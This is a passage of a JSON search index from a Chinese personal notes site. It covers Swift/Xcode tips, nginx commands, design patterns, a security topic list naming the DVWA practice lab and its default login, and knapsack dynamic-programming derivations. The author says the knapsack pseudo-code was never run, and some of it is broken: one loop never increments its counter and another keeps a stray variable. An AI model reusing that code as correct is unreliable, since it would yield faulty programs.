代码中按照适当的方式使用。","tags":"后端","url":"/yq-docs-rear-end-swift-turtorial-Use-SPM-(Swift-Package-Manager).html","loc":"/yq-docs-rear-end-swift-turtorial-Use-SPM-(Swift-Package-Manager).html"},{"title":"使用modulemap导入C++框架","text":"自己使用modulemap只导入某一个头文件,\n文件是位于SDK库的 libproc.h , 奈何一直失败, 故放弃.... 贴一些相关的资料: Importing Headers from a C++ Package Target Mixing Languages in an Xcode project Importing C++ into Swift 反正是看了一圈, 好像没直接支持的,\n如果要拿出来弄成target或者框架啥的, 就好麻烦,\n毕竟只需要导那一个...,\n暂时先桥接处理吧 使用modulemap 大致两步流程 编写 modulemap 文件, 命名为 module.modulemap (在xcode新建会自带后缀) 在 TARGETS 下配置 Swift Compiler - Search Paths 为modulemap文件所在目录 详细说明 modulemap 不止可以使用在 C++, 也可以是C, 也不止是包和框架,\n还可以直接在当前项目内直接新拉一个组用,\n但是最重要的一点, 文件名只能定义为 `module` 另外需配置 Swift Compiler - Search Paths 为modulemap文件所在目录,\n以根目录下 Modules/module.modulemap 为例 (且一定要选 TARGETS 而不是 PROJECT ): $(SRCROOT)/Modules 重要 modulemap文件名只能叫 module module.modulemap内容示例: module ProcInfo {\n    header \"tt.h\"\n    export *\n} 其他说明 有个新的问题, 就是在自定义的头文件, 无法导入其他头文件并正常使用,\n以导入SDK库的libproc为例: // tt.h\n#ifndef tt_h\n#define tt_h\n\n//#include <libproc.h>\n//#import <libproc.h>\n#import </Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX14.2.sdk/usr/include/libproc.h>\n\n// 不知道为啥, 就是找不到sdk包里面的 libproc...\n\n#define NAME \"YQ\"\n#define NAME2 \"YQ\"\n#define PROC_PIDPATHINFO_MAXSIZE PROC_PIDPATHINFO_MAXSIZE\n#define PROC_Q_MAXSIZE PROC_PIDPATHINFO_MAXSIZE\n#define SIZEYQ \"PROC_PIDPATHINFO_MAXSIZE\"\n\n#endif /* tt_h */ 不管 import 怎么写, 不管在 header path怎么设置, 哪怕是直接导入绝对路径, cmd + click 都找不到... 最后尝试了一下在swift中使用, 发现一个问题,\n就是虽然头文件中没发直接按住Command键并单击来导航到导入的头文件,\n但是代码中可以拿到部分值 注解 无法通过 按住Command键并单击来 自定义头文件中引入的头文件来确定是否成功导入,\n貌似根本没发在项目支持.","tags":"后端","url":"/yq-docs-rear-end-swift-turtorial-Use-moduleMap-to-import-the-C-++-framework.html","loc":"/yq-docs-rear-end-swift-turtorial-Use-moduleMap-to-import-the-C-++-framework.html"},{"title":"Xcode的Info配置","text":"配置位置 这里配置时, 会自动新建一个info.plist文件.\n若这里没有相应的选项, 那么可点击任意条目的 + 进行新增,\n如图: 下面介绍常见条目作用 Application is agent (UIElement): boolean 用来将应用程序设置为代理（agent）应用程序。\n应用程序将以无窗口的形式运行，并且不会在 Dock 中显示应用程序图标。 通常用于实现后台任务、系统级别的服务或菜单栏应用程序等。\n代理应用程序在后台运行，不会干扰用户的工作流程，但仍然可以提供某些功能或服务。 隐藏应用程序图标：设置应用程序为代理应用程序后，应用程序的图标将不会显示在 Dock 中，从而不会占用 Dock 的空间 无窗口运行：代理应用程序通常不需要显示窗口，因此它们以无窗口的形式运行，不会在屏幕上显示用户界面。 后台任务：代理应用程序可以在后台执行任务，例如监控系统事件、定时任务、网络请求等。 系统级别的服务：代理应用程序可以提供系统级别的服务，例如全局快捷键监听、剪贴板操作、菜单栏扩展等。 额外作用: 窗口默认支持 显示在其他全屏应用上方 (可能是因为属于系统级)","tags":"后端","url":"/yq-docs-rear-end-swift-xcode-turtorial-Xcode's-Info-configuration.html","loc":"/yq-docs-rear-end-swift-xcode-turtorial-Xcode's-Info-configuration.html"},{"title":"Xcode-分发打包","text":"Xcode版本: 15.1(15C65) 当前版本 在此位置编辑Schema 或者在 Product - Schema 编辑Schema Product - Archive 进行打包 打包位置 然后会进入 Archive 界面, 选择 Distribute App 注意, Archive 界面也可以通过 Window - Organizer 进入: 没购买官方开发者账号的就选 Custom 来导出副本到本地 正规App开发者账号上传后续可以参考: https://zhuanlan.zhihu.com/p/583812511","tags":"后端","url":"/yq-docs-rear-end-swift-xcode-turtorial-Xcode-distribution-packaging.html","loc":"/yq-docs-rear-end-swift-xcode-turtorial-Xcode-distribution-packaging.html"},{"title":"xcode15新功能","text":"预览宏-Preview 新版本如果要预览 swiftUI, 直接: #Preview {\n    ContentView()\n} 即可 参考: https://juejin.cn/post/7244109491897401381","tags":"后端","url":"/yq-docs-rear-end-swift-xcode-turtorial-Xcode15-new-features.html","loc":"/yq-docs-rear-end-swift-xcode-turtorial-Xcode15-new-features.html"},{"title":"swift3.x升级到5.x","text":"先去 App Store 下载 Swiftify for Xcode : https://apps.apple.com/cn/app/swiftify-for-xcode/id1183412116?mt=12 先注册: https://swiftify.com/profile/api-key/ 主要是要获取一个API KEY 配置: 系统偏好设置 => \"扩展\"中为Xcode Source Editor(Xcode源码编辑器)选择\"Swiftyfy for Xcode\" 打开Xcode => Editor => 菜单下看到新的\"Swiftify\"子菜单 好吧不行, 坑, 这是 object-c => swift 的","tags":"后端","url":"/yq-docs-rear-end-turtorial-swift-SWIFT3.X-upgrades-to-5.x.html","loc":"/yq-docs-rear-end-turtorial-swift-SWIFT3.X-upgrades-to-5.x.html"},{"title":"命令行参数选项结构(命令行帮助文档语法格式详解)","text":"方括号 [] 方括号内的值是可选的. 可以一个括号内多个值(以空格分割), 也可以多个值都用括号包裹, 两者是等价的 尖括号 <> 表示括号内的值是必须的, 值需要被具体的值替换 管道 | 多个参数可由管道符隔开, 表示任选其一, 表示互斥 身略号 ... 等, 表示前一个值可重复 大括号 {} 或 圆括号 () 必须, 括号内的值常用管道符分割, 任选其一即可 书写规范 非括号默认参数都是必选 短选项可以堆叠: -a  -b -c\n# 等价与\n-abc 短选项的参数可选空格: -a File\n# 等价与\n-aFile 长选项的参数可用空格或者等于符号分割: --input <arg>\n# 等价与\n--input=<arg> 同一个用途选项一般适用逗号隔开: -h, --help 若需指定一个选项带有一个参数，则需 在空格或等号=后放一个描述该参数的词，如下所示。 选项参数遵循尖括号<argument>或全大写ARGUMENT的约定。 如果有必要，可以使用逗号,分隔选项。 其他 用（至少）两个空格来分隔选项和它们的非正式描述【如果只用一个空格，可能会将描述的首个词当做选项的参数】 如果要为带有参数的选项设置默认值，则使用 [default: the-default-value] 的形式将其放到选项描述中 一般常选项参数跟等号, 短选项参数不跟等号: --maxfail=<num> , -m<file> 参考:: 命令行帮助文档语法格式详解","tags":"杂乱无章","url":"/yq-docs-Chaotic-Command-line-parameter-option-structure.html","loc":"/yq-docs-Chaotic-Command-line-parameter-option-structure.html"},{"title":"设计模式","text":"面向对象程序设计 面向对象程序设计（Object-Oriented Programming）是一种范式 基本理念是将数据块与数据相关的行为封装成特殊的、名为对象的实体，同时对象实体的生成工作则是基于程序员给出的一系列\"蓝图\"，这些\"蓝图\"就是类。 类：定义对象结构的\"蓝图\" 对象：类的具体实例 软件设计原则 特征 代码复用 拓展性 设计原则 创建型模式 工厂方法 抽象工厂 生成器 原型 单例 工厂方法说明 在父类提供一个创建对象的方法，允许子类决定实例化对象的类型 结构： 两个类，一个产品类，一个创建者类 产品 声明接口 具体产品 接口的不同实现 创建者 声明返回产品对象的工厂方法 具体创建者 实现 为了实现 高内聚，低耦合 单一职责 开闭原则 注解 简单工厂 ==》 工厂方法 ==》 抽象工厂 简单工厂 简单工厂不算是一个真正的设计模式，而更像是一种我们的编程习惯，\n但是在平时编码中这不失为一个简单的方法，可以将客户程序从具体类解耦。 工厂类拥有一个 工厂-方法 ,\n接受了一个参数，通过不同的参数实例化不同的产品类。 使用一个工厂对象用来生产同一等级结构中的任意产品。（不支持拓展增加产品） 工厂方法 定义了一个创建对象的接口，但由子类决定要实例化的类是哪一个。工厂方法让类的实例化推迟到子类。 使用多个工厂对象用来生产同一等级结构中对应的固定产品。（支持拓展增加产品） 抽象工厂模式 提供一个接口，用于创建相关或依赖对象的家族，而不需要明确指定具体类。 例如，汽车可以分为轿车、SUV、MPV等，也分为奔驰、宝马等。\n我们可以将奔驰的所有车看作是一个产品族，而将宝马的所有车看作是另一个产品族。\n分别对应两个工厂，一个是奔驰的工厂，另一个是宝马的工厂。\n与工厂方法不同，奔驰的工厂不只是生产具体的某一个产品，\n而是一族产品（ 奔驰轿车 、奔驰SUV、奔驰MPV）。\n\"抽象工厂\"的\"抽象\"指的是就是这个意思。 即相比于工厂方法，抽象工厂定义了一系列的产品，而不是一个产品。 使用多个工厂对象用来生产不同产品族的全部产品。（不支持拓展增加产品；支持增加产品族）","tags":"杂乱无章","url":"/yq-docs-Chaotic-desgin-pattern.html","loc":"/yq-docs-Chaotic-desgin-pattern.html"},{"title":"关于最后一行空行的问题","text":"主要有两个理由： 某些工具（特别是比较古老的），如果文件的末尾没有 \\n 或 \\r ，就会忽略最后一行。 最后有一个空行，便于判断这个文件传输完整（而不是只传了一半） 现在没有这个问题 大多是一个规范习惯","tags":"杂乱无章","url":"/yq-docs-Chaotic-last-line-empty-line-problem.html","loc":"/yq-docs-Chaotic-last-line-empty-line-problem.html"},{"title":"一些待看博客","text":"https://yizibi.github.io/ https://www.python.org/downloads/release/python-365/ https://www.cnblogs.com/lgyxta/p/12100623.html https://blog.csdn.net/qq_43739097/article/details/104383456 https://blog.csdn.net/HBT036017/article/details/104930595 https://blog.csdn.net/weixin_31682031/article/details/113135005 https://www.cnblogs.com/linuxk/p/9371475.html 修改mysql密码： https://blog.csdn.net/scorpio_j/article/details/112557655?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0.opensearchhbase&spm=1001.2101.3001.4242.1 没啥用 最后重装解决 python队列： https://blog.csdn.net/weixin_43533825/article/details/89155648 python多线程： https://www.runoob.com/python3/python3-multithreading.html https://blog.csdn.net/jiahao1186/article/details/90209397 https://cloud.tencent.com/developer/article/1669101 mysql日志删除： https://www.cnblogs.com/tv151579/p/8289204.html https://www.cnblogs.com/sandea/p/5200054.html python join https://cloud.tencent.com/developer/article/1478401 mysql编码： https://my.oschina.net/zhoyq/blog/3169449 mysql查重 https://blog.csdn.net/haoui123/article/details/80562835 Python子进程执行完但是不结束？ https://www.zhihu.com/question/63265466 winrar下载， 个人免费，商业收费 https://www.rarlab.com/download.htm 设计模式 https://refactoringguru.cn/design-patterns/bridge python3下载mysqlclient https://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python","tags":"杂乱无章","url":"/yq-docs-Chaotic-some-blog-unwatch.html","loc":"/yq-docs-Chaotic-some-blog-unwatch.html"},{"title":"图片格式","text":"简述 JPEG < PNG < SVG JPEG: 有损格式, 不能保存透明区域 PNG: 无损压缩, 较JPEG更大, 支持透明区域 GIF: 动图, 目前兼容性最好 SVG: 设计用, 文件信息以代码形式保存 JPEG JPEG 格式是一种有损的图片压缩格式，它用算法尽量去除冗余的图像和色彩数据，在图片文件较小的情况下可以得到比较高质量的图片。 PNG PNG 图片格式采用的是无损压缩，和 JPEG 相比文件的体积是会大一些的，但是图片质量非常好，而且还支持 Alpha 通道，也就是说 PNG 可以存部分区域透明的图片。 GIF GIF 的特点就是它可以是动图，而且支持图片的透明，但是出于体积的考虑 GIF 只支持 256 色，清晰度和色彩质量并不是很好。 SVG SVG, 可缩放矢量图形(Scalable Vector Graphics)。SVG 格式把图像信息用代码的形式存进了文件中，你可以通过任何一个文本编辑软件（记事本、VS Code等）打开来查看源代码，所以它不但体积小而且扩展性很强，我们可以通过编程的方式控制 SVG 图片进行交互和动画的播放。 怎么选择图片格式 照片用 JPEG，因为色彩比较丰富也不需要透明，用 JPEG 即有较高的图像质量还能保持较小的文件体积。 小图片，小图标，有透明需求的用 PNG，尺寸较大的照片如果用 PNG 文件体积会比 JPEG 大不少。 动图用 GIF，虽然现在有更好的动图技术格式，但是 GIF 是兼容性最好的，基本上所有的设备和平台都支持的很好。 参考:: https://zhuanlan.zhihu.com/p/134173186","tags":"杂乱无章","url":"/yq-docs-Chaotic-Image-Format.html","loc":"/yq-docs-Chaotic-Image-Format.html"},{"title":"COM机制","text":"COM(组件对象模型), 由微软提出, 是关于如何建立组件以及如何通过组件建构应用程序的一个规范. 到2023的现在, 技术可以说是过时了, 思想值得学习. 对组件的需求: 动态链接 隐藏内部实现 参考: COM技术内幕 || 这样理解COM组件","tags":"杂乱无章","url":"/yq-docs-Chaotic-COM-mechanism.html","loc":"/yq-docs-Chaotic-COM-mechanism.html"},{"title":"通过命令打开系统浏览器","text":"前言 当使用shell, 且当前主机拥有GUI浏览器时, 会有在shell中通过浏览器打开网址的需求 使用 Mac open 'https://www.baidu.com' Linux x-www-browser 'https://www.baidu.com' Windows cmd /c start https://www.baidu.com","tags":"杂乱无章","url":"/yq-docs-Chaotic-Open-the-browser-through-command.html","loc":"/yq-docs-Chaotic-Open-the-browser-through-command.html"},{"title":"AI","text":"这个其实是一个比较广的 计算机视觉 自然语言处理 推荐系统 搜索引擎 等 因为计算机性能发展迅速, 比较火的是 深度学习(神经网络),\n说白了就是靠着算力一直算, 以前的时代配置不行,\n没那个条件. 深度学习 计算机视觉 机器学习 数理 开源模型","tags":"linux","url":"/yq-doc-source-ai.html","loc":"/yq-doc-source-ai.html"},{"title":"杂乱无章","text":"计算机网络 大数据 中间件 常用工具使用 剪辑 Base64编码 COM机制 crc数据校验 ffmpeg mod之旅 记录vs下载慢的问题 代码命名 关于广告 关于雪球 图片格式 版本说明 自建代理 设计模式 关于位掩码 正则表达式 浏览器输入url 一些待看博客 搜索引擎实现 一些开源便利的Git项目 命令行参数选项结构 通过命令打开浏览器 关于最后一行空行的问题 语义化版本 一些平台收集 互联网上的免费（商用）照片分/共享平台: https://unsplash.com 目前全球最大的综合类自由职业平台(Upwork): https://www.upwork.com/nx/signup/ 常用镜像地址整理 清华开源镜像站: 索引地址: https://mirrors.tuna.tsinghua.edu.cn 帮助地址: <https://mirrors.tuna.tsinghua.edu.cn/help> 阿里云镜像站 地址: https://developer.aliyun.com/mirror/","tags":"杂乱无章","url":"/yq-docs-Chaotic-index.html","loc":"/yq-docs-Chaotic-index.html"},{"title":"容器、代理与集群","text":"暂时只写了docker与nginx, 集群待补充 docker nginx k8s 什么是虚拟化技术？ 维基百科中的解释是这样的: 虚拟化（技术）是一种资源管理技术，是将计算机的各种实体资源（CPU、内存、磁盘空间、网络适配器等），\n予以抽缴、转换后呈现出来并可供分割、组合为一个或多个电脑配置环境。 对于一台计算机，我们可以简单的划分为三层：从下到上依次是 物理硬件层 操作系统层 应用程序层 容器和虚拟机差异 容器技术的演变: 纯物理机     ---->     物理机上多VMWare虚拟机       ---->         容器\n\n浪费资源                    节省, 也有限度                      轻量级(有时候只想要一个mysql这种, 可能还想要多个版本共存)\n不易拓展迁移                迁移方便                            更高效利用系统资源\n                            还是比较重量级 注解 有个误解, Docker不完全代表容器;\nDocker只是实现了容器技术的一种方式 虚拟机工具: WMVare WorkStation (个人学习使用), 仅支持Windows VMVare esxi (企业版虚拟化); 高性能服务器结合，进行服务器资源虚拟化 KVM, Linux下虚拟工具 虚拟机技术 虚拟机是虚拟出一套硬件，在其上面运行一个完整的操作系统，\n例如我们使用KVM，指定系统镜像然后装系统，最终可以使用，在该系统上再运行所需的应用程序。 KVM创建虚拟机时，若指定较少的cpu，内存，硬盘等资源，虚拟机性能较低, 业务支持不好。 容器技术 容器内的应用程序直接运行在宿主机的内核上，容器内没有自己的内核，\n也没有对硬件进行虚拟，因此容器比起虚拟机更为轻便。 容器对比KVM的好处 容器能够提供宿主机的性能，而kvm虚拟机是分配宿主机硬件资源，\n性能较弱 •同样配置的宿主机，最多可以启动10个虚拟机的话，可以启动100+的容器数量; 启动一个KVM虚拟机，得有一个完整的开机流程，花费时间较长，或许得20S，而启动一个容器只需要 1S; KVM需要硬件CPU的虚拟化支持，而容器不需要; docker更高效的利用系统资源 容器不需要进行硬件虚拟化以及运行一个完整操作系统的额外开销，\ndocker对系统资源的利用率更高，无论是应用执行，\n文件存储，还是在内存消耗等方面，都比传统虚拟机更高效。\n因此一个同样配置的主机，可以运行处更多数量的容器实例。 集群、分布式、微服务的区别 集群 将同一份项目或者系统, 物理部署到多台机器上分流, 物理上提高可用性 分布式 将项目, 垂直/水平 拆分为多个子模块, 分开部署 水平拆分: 根据\"分层\"的思想进行拆分。 比如前后端分离就是将 前端表示层 单独拆出来 垂直拆分: 根据业务进行拆分。\n例如，可以根据业务逻辑，将\"电商项目\"拆分成\"订单项目\"、\"用户项目\"和\"秒杀项目\"。\n显然这三个拆分后的项目，仍然可以作为独立的项目使用。像这种拆分的方法，就成为垂直拆分。 微服务 对于分布式的子模块, 进行更细粒度的拆分. 且在当前流程下不存在更细粒度的拆分 例如，以上\"订单项目\"本来就是垂直拆分后的子项目，\n但实际上\"订单项目\"还能进一步拆分为\"购物项目\"、\"结算项目\"和\"售后项目\" Nginx常用命令 一览: # 快速关闭Nginx，可能不保存相关信息，并迅速终止web服务\nnginx -s stop\n\n# 平稳关闭Nginx，保存相关信息，有安排的结束web服务\nnginx -s quit\n\n# 因改变了Nginx相关配置，需要重新加载配置而重载\nnginx -s reload\n\n# 重新打开日志文件\nnginx -s reopen\n\n# 为 Nginx 指定一个配置文件，来代替缺省的\nnginx -c filename\n\n# 不运行，而仅仅测试配置文件。nginx 将检查配置文件的语法的正确性，并尝试打开配置文件中所引用到的文件\nnginx -t\n\n#  显示 nginx 的版本\nnginx -v\n\n# 显示 nginx 的版本，编译器版本和配置参数\nnginx -V\n\n# 格式换显示 nginx 配置参数\n2>&1 nginx -V | xargs -n1\n2>&1 nginx -V | xargs -n1 | grep lua","tags":"容器与集群","url":"/yq-docs-Container-and-cluster-index.html","loc":"/yq-docs-Container-and-cluster-index.html"},{"title":"安全","text":"Python灰帽子 kali 生成TLS(SSL)证书 一些备忘 常见漏洞 提权总结 安全领域的AI 渗透测试流程 漏洞缺陷分类 一些有用的网站 brup 学习记录 逆向工程 大致路线 渗透 单纯的攻击 渗透测试 模拟渗透(有授权与限制, 保密等) 还有 EDU SRC (教育渗透) 相关工具 DVWA https://github.com/digininja/DVWA 通过简单明了的界面来练习一些最常见的 Web 漏洞，所练习的漏洞具有不同的难度级别。\n请注意，此软件存在提示和无提示的漏洞。 这是特意为止。\n我们鼓励您依靠自己的能力尝试并发现尽可能多的安全问题。 clone地址: https://github.com/digininja/DVWA.git 默认用户密码: admin\npassword 安装见 DVWA靶场搭建","tags":"安全","url":"/yq-docs-Safety-index.html","loc":"/yq-docs-Safety-index.html"},{"title":"数据结构","text":"树 Hash 回溯算法 贪心算法 算法-动态规划 主要是要想到一个状态转移方程, 根据这个方程来写代码,\n以 算法示例-01背包问题 为例 注解 也叫填表法, 记忆化搜索 算法-贪心 以 01 背包为例, 先按照贪心的方向排序,\n比如考虑三种排序策略 重量最轻 价值最高 性价比最高(价值/重量最高) 然后按照这个顺序从最好的开始, 但是会导致一个问题, 结果不一定是最优解. 可参见: index 滚动数组 主要将目标集中在当前计算需要的数据上, 丢弃不必要的数据 滚动数组-斐波那契数列 先以 斐波那契数列 为例, 第一和第二个数为1, 后续每一个数前两个数之和: 1、1、2、3、5、8、13、21、34 基础的解法 d = [1, 1]\nfor i in range(2, n):\n  d[i] = d[i-1] + d[i-2] 这个时候的空间复杂度为数组d, O(n) 两个变量解法 仔细观察, 计算每一步实际上只需要前两次的值就行,\n那么实际上可以只需要两个变量即可: a, b = [1, 1]\ni = 2\nwhile i < n:\n  a = a+b\n  b = a+b\n  i += 2\n\n# 最后需要判断一个奇偶决定返回a还是b\nreturn b if n % 2 == 0 else a 这个时候空间复杂度就变成了O(2), 就是O(1) 大小为3数组解法 或者利用一个大小为3的数组: d = [0, 1, 1]\nfor i in range(2, n):\n  d[0], d[1] = d[1], d[2]\n  d[2] = d[0] + d[1]\n\nreturn d[2] 算法示例-01背包问题 有一个物品重量数据 width 和 其中每一个物品对应的价值数组 value,\n比如 width[i] 的价值是 value[i],\n求当背包容量为 big-package 时, 能装下物品的最大价值 首先找到状态转移方程, 定义: i, 物品下标i, 表示这个物品 j, 当前背包容量 d[i][j], 表示当选择第i个物品时候, 且容量为j时候的最大价值 当遍历到第i个物品时候, 有两种情况: 选择第i个物品, 那么 d[i][j] = d[i-1][j-width[i]] + value[i] 不选择第i个物品, 那么 d[i][j] = d[i-1][j] 选择这两个情况中价值最大的那个: d[i][j] = max(d[i-1][j], d[i-1][j-width[i]] + value[i]) 要注意边界条件和容量值, 比如容量值要大于0才可以选择当前物品: j-width[i] > 0 边界条件, 当容量j为0的时候, 对于任意i: d[i][0] = 0 如果没有物品, 虽然也可以定义: d[0][j] = 0 但是仔细考虑是没有必要的, 一方面是在i的维度会多一层值,\n另一方面可以直接从第一个物品(下标0)来作为边界值, 就不用考虑下标减1的情况: d[0][j] = value[0] if j >= width[0] else 0\n# 或者三目, 伪代码懂意思就行\nd[0][j] = j >= width[0] ? value[0] : 0 当然用没有物品作为边界值也可以, 不过要注意, 这样后面使用下标注意减1,\n因为0表示没有物品, 1表示第一个物品, 对应索引为0(也就是要记得减一) 伪代码解(使用第一个物品作为边界): n = len(width)\n\n# n 行, 背包数 + 1 列, 初始值为 0\nd = [[0] * (big_package_size+1) for _ in range(n)]\n\n# 当选择第一个物品时, 边界值\nfor j in range(big_package_size+1):\n  d[0][j] = value[0] if j >= width[0] else 0\n\n# 构造动态转移方程\nfor i in range(n):\n  for j in range(big_package_size+1):\n    if j-width[i] >= 0:\n      d[i][j] = max(\n        d[i-1][j],\n        d[i-1][j-width[i]] + value[i]\n      )\n    else:\n      d[i][j] = d[i-1][j]\n\n# 为什么直接是最后一个值, 因为都是从上一个值推导出来的 max ...\nreturn d[n-1][big_package_size] 图解, 以物品重量 w=[1,3,4], 价值 v=[15,20,30], 背包最大容量4为例: 列,容量j    0       1       2       3       4\n行,物品i\n\n  0                   0       15      15      15      15\n\n  1                   0       15      15      20      35\n\n  2                   0       15      15      20      35 注解 不需要先排序, 因为看物品i, 是一个个子问题, 与排序是否无关 两个for循环嵌套顺序不影响结果, 因为\n如果外层用物品, d[i][j] 是根据 d[i-1][j] 与 d[i-1][j-width[i]] 确定的(需要用的物品下标i小于等于当前层面, 之前层的所有j都是有值的),\n如果外层用容量, d[i][j] 也是根据 d[i-1][j] 与 d[i-1][j-width[i]] 确定的(需要用的容量j小于等于当前层, 之前层的所有i都是有值的),\n都在上一层 提示: d[i-1][j - width[i]] 是物品 width[0:i] (下标0到i-1) 的最优解 直接在编辑器手写的, 没运行过, 懂意思就行 优化空间-滚动数据 滚动数组是什么可看上面 滚动数组 分析, 当遍历物品i时候, 需要用的数据只有物品i-1的, 即只会使用上一层,\n区别就是根据不同的情况, 选择上一层的不同容量的数据,\n那么根据滚动数组的概念, 辅助数组只要两层即可(当前层与上一层), 这个时候内循环不管从大到小\n还是从小到大遍历皆可. 再仔细想我们的规划方程: d[i][j] = max(d[i-1][j], d[i-1][j-width[i]] + value[i]) 可以转换为一维: d[j] = max(d[j], d[j-w[i]] + v[i]) 现在讲讲内循环为什么应该从大到小.\n先看外循环, 每次计算物品i时, 用到的物品下标只与i-1有关,\n再看内循环的j, 用到的值有: j\nj-width[i] 两种策略, 还是以上面的物品重量 w=[1,3,4], 价值 v=[15,20,30], 背包最大容量4为例: 列,容量j    0       1       2       3       4\n行,物品i\n\n  0                   0       15      15      15      15\n\n  1                   0       15      15      20      35\n\n  2                   0       15      15      20      35 我们尝试将其转换为一维数组, 当行物品i==1时: d[1][0] = 0\nd[1][1] = max(d[0][1], d[0][1-3] + 20) = max(15) = 15\nd[1][2] = max(d[0][2], d[0][2-3] + 20) = max(15) = 15\nd[1][3] = max(d[0][3], d[0][3-3] + 20) = max(15, 20) = 20\nd[1][4] = max(d[0][4], d[0][4-3] + 20) = max(15, 15+20) = 35 再次可以总结出, 计算i层时候, 只与上一层i-1有关(这里例子是1-1=0),\n那列j与什么有关呢, 观察目前的i==1变化趋势: 1-3\n2-3\n3-3\n4-3 其实归根结底就是: j - w[i] 且j不断增大到最大容量, 然后就更新当前容量时候的值,\n那么可以说 当前更新的 容量列(j) 与 上一层的: j - w[i] 有关, 且: j - w[i] 总是小于等于j的. 所以如果要用一维数据d[j], 当内循环从小到大遍历的时候: d[j] = max(d[j], d[j-w[i]] + v[i]) 先记录一下当前的d数组d[0]: d = [0,       15,      15,      15,      15] 归纳一下当i==1的时候更新的内容: d[0] = 0\nd[1] = max(d[1], d[1-3] + 20) = max(15) = 15\nd[2] = max(d[2], d[2-3] + 20) = max(15) = 15\nd[3] = max(d[3], d[3-3] + 20) = max(15, d[0] + 20) = 20\nd[4] = max(d[4], d[4-3] + 20) = max(15, d[1] + 20) = 20 观察一下从小到大遍历有没有什么问题? 当i==1, 计算d[3] 的时候, 用到了d[0], 但是d[0] 其实已经被更新了, 是新的: d[0] = 0 同理当i==1, 计算d[4] 的时候, 用到了d[1], 但是d[1] 其实已经被更新了, 是新的: d[1] = 15 那么怎么解决这个问题呢? 答案就是 从大到小遍历 , 因为当更新 d[j] 是, 需要用到的 j-w[i] 往往是小于\n当前j的, 所以我们只要先更新最大的, 这个时候 j-w[i] 还没被更新, 还是上次的. 简而言之, 计算 d[i][j] 时, 依赖 d[i-1][j-width[i]] , 需要保证上一层的数据使用的时候还是原来的,\n即 确保 ``d[i-1][j-width[i]]`` 存储的是上一行的值，即确保 ``d[j-width[i]]`` 还没有被更新，所以遍历方向是从大到小。 编码: for i in range(n):  # 遍历物品\n  for j in range(big_package_size, -1, -1): # 遍历背包容量\n    if j >= weight[i]:\n      d[j] = max(d[j], d[j - weight[i]] + value[i])\n    else: # 说明前面的都不满足 j - weight[i] >= 0 , 值就是当前值, 直接跳出此处循环\n      break 算法示例-完全背包 有一个物品重量数据 width 和\n其中每一个物品对应的价值数组 value,\n.. 以及每一个物品的花费数组 cost(就是你要拿这个物品要用多少钱买),\n且 每一个物品i是无限的 ,\n比如 width[i] 的单价值是 value[i],\n.. 购买单件需要花费 cost[i]\n求当背包容量为 big-package 时, 能装下物品的最大价值 与 算法示例-01背包问题 相比, 完全背包物品有无限个 与其相似, 得出规律: 选择 0 件物品i 的最大价值，即: d[i-1][j]\n选择 1 件物品i 的最大价值，即: d[i-1][j-width[i]] + value[i]\n选择 2 件物品i 的最大价值，即: d[i-1][j-width[i]*2] + value[i]*2\n... 记得考虑条件, 不能超过背包容量: j-width[i] * k >= 0 还是先遍历物品\n方程: d[i][j] = max(d[i-1][j], d[i-1][j-width[i]*k] + value[i]*k)\n\n# =》 当k为0\n\nd[i-1][j-width[i]*k] + value[i]*k = d[i-1][j]\n\n# 所以可以直接写成\n\nd[i][j] = max({d[i-1][j-width[i]*k] + value[i]*k}) 当考虑k时编码: for i in range(n):\n  for j in range(big_package_size+1):\n    # 初始\n    d[i][j] = d[i-1][j]   # 即k==0\n    k = 1\n    # while j-width[i]*k >= 0:\n    while j >= width[i]*k:\n      d[i][j] = max(\n        d[i][j],\n        d[i-1][j-width[i]*k] + value[i]*k\n      ) 可以看出时间复杂度是比较高的,\n这个时候是否可以将k的因素给去掉呢? 可以. 先看原始的方程: d[i][j] = max({d[i-1][j-width[i]*k] + value[i]*k}) 将k展开: d[i][j] = max({d[i-1][j-width[i]*k] + value[i]*k})\n  = max(d[i-1][j-width[i]*0] + value[i]*0,\n      d[i-1][j-width[i]*1] + value[i]*1,\n      d[i-1][j-width[i]*2] + value[i]*2\n      ...\n      d[i-1][j-width[i]*k] + value[i]*k\n    ) 可以简单的得到当容量统一减小width[i]时: d[i][j-width[i]]\n  = max(d[i-1][j-width[i]*1] + value[i]*0,\n      d[i-1][j-width[i]*2] + value[i]*1,\n      d[i-1][j-width[i]*3] + value[i]*2\n      ...\n      d[i-1][j-width[i]*(k+1)] + value[i]*k\n    ) 对于max来说, 在其上加减一个数是不影响结果的, 所以对上一个式子统一加上value[i]: d[i][j-width[i]] + value[i]\n  = max(d[i-1][j-width[i]*1] + value[i]*1,\n      d[i-1][j-width[i]*2] + value[i]*2,\n      d[i-1][j-width[i]*3] + value[i]*3\n      ...\n      d[i-1][j-width[i]*(k+1)] + value[i]*(k+1)\n    ) 就得到了: d[i][j] = max(d[i-1][j-width[i]*k] + value[i]*k)              # 0 <= k < max_k\n\n# 将0分离出来\nd[i][j] = max(d[i-1][j], d[i-1][j-width[i]*k] + value[i]*k)   # 1 <= k < max_k\n\n# 带入上面对max的操作 d[i][j-width[i]] + value[i]\nd[i][j] = max(d[i-1][j], d[i][j-width[i]] + value[i])         # 1 <= k < max_k 可以简单的理解为, 当计算物品i时, 从相邻的物品(可能是自己)算起, 此时消掉k编码: for i in range(n):\n  for j in range(big_package_size+1):\n    if j >= width[i]:\n      d[i][j] = max(\n          d[i-1][j],\n          d[i][j-width[i]] + value[i]\n        )\n      else:\n        d[i][j] = d[i-1][j] 使用 滚动数组 ,\n转换为一维数组\n方程: d[j] = max(d[j], d[j-width[i]] + value[i]) 注意此时与01背包不同, 01背包使用的是上一层的,\n所以内循环是从大到小遍历,\n但是此时是完全背包, 使用的是当前层的数据, 需要先更新,\n所以完全背包内循环是从小到大遍历: for i in range(n):\n  for j in range(big_package_size+1):\n    if j >= width[i]*k:\n      d[j] = max(\n          d[j],\n          d[j-width[i]] + value[i]\n        ) 此处内循环是从小到大遍历,\n简而言之, 计算 d[i][j] 时, 依赖 d[i][j-width[i]] , 需要保证数据使用的时候还是当前层已经更新的.\n即 确保 ``d[i][j-width[i]]`` 存储的是当前行的值，确保 ``d[j-width[i]]`` 已经更新，所以遍历方向是从小到大。 参考: 【动态规划/背包问题】从数学角度推导「完全背包」与「01 背包」之间的遍历顺序关系 背包问题总结( 1 ) 01 背包，完全背包，多重背包，分组背包 